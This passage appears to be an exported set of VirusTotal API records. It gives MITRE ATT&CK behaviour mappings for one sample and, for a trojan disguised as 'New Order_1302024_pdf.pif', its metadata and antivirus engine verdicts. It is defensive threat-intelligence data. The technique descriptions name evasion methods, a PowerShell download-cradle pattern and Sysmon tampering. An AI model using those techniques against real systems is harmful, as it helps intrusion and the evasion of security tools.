                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors."
                  }
                ]
              }
            ]
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1036",
                "name": "Masquerading",
                "link": "https://attack.mitre.org/techniques/T1036/",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ]
              },
              {
                "id": "T1562.001",
                "name": "Disable or Modify Tools",
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
                  }
                ]
              },
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  }
                ]
              },
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ]
              },
              {
                "id": "T1027.002",
                "name": "Software Packing",
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  },
                  {
                    "severity": "INFO",
                    "description": "PE file has an executable .text section which is very likely to contain packed code (zlib compression ratio < 0.3)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  }
                ]
              },
              {
                "id": "T1518.001",
                "name": "Security Software Discovery",
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  },
                  {
                    "severity": "INFO",
                    "description": "AV process strings found (often used to terminate AV products)"
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"
                  }
                ]
              },
              {
                "id": "T1018",
                "name": "Remote System Discovery",
                "link": "https://attack.mitre.org/techniques/T1018/",
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ]
              },
              {
                "id": "T1016",
                "name": "System Network Configuration Discovery",
                "link": "https://attack.mitre.org/techniques/T1016/",
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Checks the online ip address of the machine"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if Microsoft Office is installed"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0006",
            "name": "Credential Access",
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "id": "T1003",
                "name": "OS Credential Dumping",
                "link": "https://attack.mitre.org/techniques/T1003/",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ]
              },
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              },
              {
                "id": "T1114",
                "name": "Email Collection",
                "link": "https://attack.mitre.org/techniques/T1114/",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to search for mail accounts"
                  }
                ]
              },
              {
                "id": "T1005",
                "name": "Data from Local System",
                "link": "https://attack.mitre.org/techniques/T1005/",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1573",
                "name": "Encrypted Channel",
                "link": "https://attack.mitre.org/techniques/T1573/",
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  }
                ]
              },
              {
                "id": "T1571",
                "name": "Non-Standard Port",
                "link": "https://attack.mitre.org/techniques/T1571/",
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses network protocols on non-standard ports"
                  },
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  }
                ]
              },
              {
                "id": "T1105",
                "name": "Ingress Tool Transfer",
                "link": "https://attack.mitre.org/techniques/T1105/",
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  }
                ]
              },
              {
                "id": "T1095",
                "name": "Non-Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1095/",
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ]
              },
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "LOW",
                    "description": "Uses dynamic DNS services"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses a known web browser user agent for HTTP communication"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c7362845283503e1538fd1c4ba224becc55c213613c30684fa790cd6f99d2094/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bac6ba0e994d74c761c871"
  },
  "data": {
    "id": "39266f36d22aee10dbbeeba147e5fbe1448933c2a256b6097f7fec380e5893fb",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/39266f36d22aee10dbbeeba147e5fbe1448933c2a256b6097f7fec380e5893fb"
    },
    "attributes": {
      "pe_info": {
        "timestamp": 1706585427,
        "machine_type": 34404,
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "chi2": 549.74,
            "filetype": "PNG",
            "entropy": 7.961813926696777,
            "sha256": "27298ce178ed439f5d26f13d91ea84defa3914071dad51646e72e528d1b5b2a8",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 2386.4,
            "filetype": "ICO",
            "entropy": 1.5166423320770264,
            "sha256": "fe081199d40760c06b39b5f3bb98063bf4d1d6a172262fbaf414157f1ca63022",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 76258.17,
            "filetype": "unknown",
            "entropy": 3.3795578479766846,
            "sha256": "de3a262e5a6f82f78881ab543f94b656ddc0bf2c66f3e4cf5e626122e099f444",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 3
        },
        "resource_types": {
          "RT_ICON": 1,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 651610.31,
            "virtual_address": 8192,
            "flags": "rx",
            "raw_size": 872448,
            "entropy": 7.77,
            "virtual_size": 872128,
            "md5": "73bb3eba9ec8d29b48c2098800311073"
          },
          {
            "name": ".rsrc",
            "chi2": 22175.67,
            "virtual_address": 884736,
            "flags": "r",
            "raw_size": 11264,
            "entropy": 7.67,
            "virtual_size": 11064,
            "md5": "138c332eeff3b691360ab2af2ac06acb"
          }
        ]
      },
      "packers": {
        "PEiD": "Microsoft Visual C++ vx.x DLL"
      },
      "last_analysis_date": 1706713684,
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "type_description": "Win32 EXE",
      "names": [
        "39266f36d22aee10dbbeeba147e5fbe1448933c2a256b6097f7fec380e5893fb.exe",
        "EYUG.exe",
        "New Order_1302024_pdf.pif"
      ],
      "times_submitted": 6,
      "first_submission_date": 1706601215,
      "sha256": "39266f36d22aee10dbbeeba147e5fbe1448933c2a256b6097f7fec380e5893fb",
      "last_submission_date": 1706713684,
      "vhash": "085026757\"z",
      "type_tag": "peexe",
      "dot_net_assembly": {
        "tables_rows_map_log": "4989a94a7945857678464666456757",
        "external_assemblies": {
          "": {
            "version": "57748.24544.18116.14271"
          }
        },
        "tables_rows_map": "2c1360fa034b013221831c860230416013d0296c01c1cfe20060000b135120",
        "streams": {
          "#US": {
            "chi2": 636,
            "size": 4,
            "entropy": 0.8112781047821045,
            "md5": "03bf3e510fa084f991c7a5e607d9712b"
          },
          "#~": {
            "chi2": 1372185.625,
            "size": 27292,
            "entropy": 4.9280009269714355,
            "md5": "fccf24bf336dbace8a13de287619230d"
          },
          "#Schema": {
            "chi2": 1020,
            "size": 4,
            "entropy": 0,
            "md5": "f1d3ff8443297732862df21dc4e57262"
          },
          "#Strings": {
            "chi2": 1020,
            "size": 4,
            "entropy": 0,
            "md5": "f1d3ff8443297732862df21dc4e57262"
          },
          "#GUID": {
            "chi2": 272,
            "size": 16,
            "entropy": 3.875,
            "md5": "a6b1ef1c3cc93651964494c9ddc87291"
          },
          "#Blob": {
            "chi2": 1020,
            "size": 4,
            "entropy": 0,
            "md5": "f1d3ff8443297732862df21dc4e57262"
          }
        },
        "tables_present": 30,
        "clr_version": "v4.0.30319",
        "assembly_data": {
          "majorversion": 9760,
          "minorversion": 0,
          "hashalgid": 16252928,
          "buildnumber": 249,
          "flags": 16384000,
          "revisionnumber": 9776
        },
        "tables_present_map": "f09fdb6df57",
        "clr_meta_version": "1.1",
        "type_definition_list": [
          {
            "namespace": "uncategorized",
            "type_definitions": []
          }
        ]
      },
      "unique_sources": 3,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.msil/msilheracles",
        "popular_threat_name": [
          {
            "value": "msil",
            "count": 9
          },
          {
            "value": "msilheracles",
            "count": 6
          },
          {
            "value": "noon",
            "count": 4
          }
        ],
        "popular_threat_category": [
          {
            "value": "trojan",
            "count": 15
          }
        ]
      },
      "magic": "PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "tags": [
        "64bits",
        "spreader",
        "peexe",
        "assembly"
      ],
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "authentihash": "6bfe16f9d4fe77c5c1691b2eb5eaa50e69ae800476e0af27a06c57dcecbce72e",
      "reputation": 0,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.Noon.l!c"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "undetected",
          "result": null
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143653"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143653"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Artemis!Trojan"
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Artemis!1D60063801A0"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.MalPack.PNG"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5042",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Spyware.Msil.Kryptik.Vy17"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.139.50917",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 005b13851 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "TrojanSpy:MSIL/Kryptik.2a846d6c"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.139.50919",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 005b13851 )"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
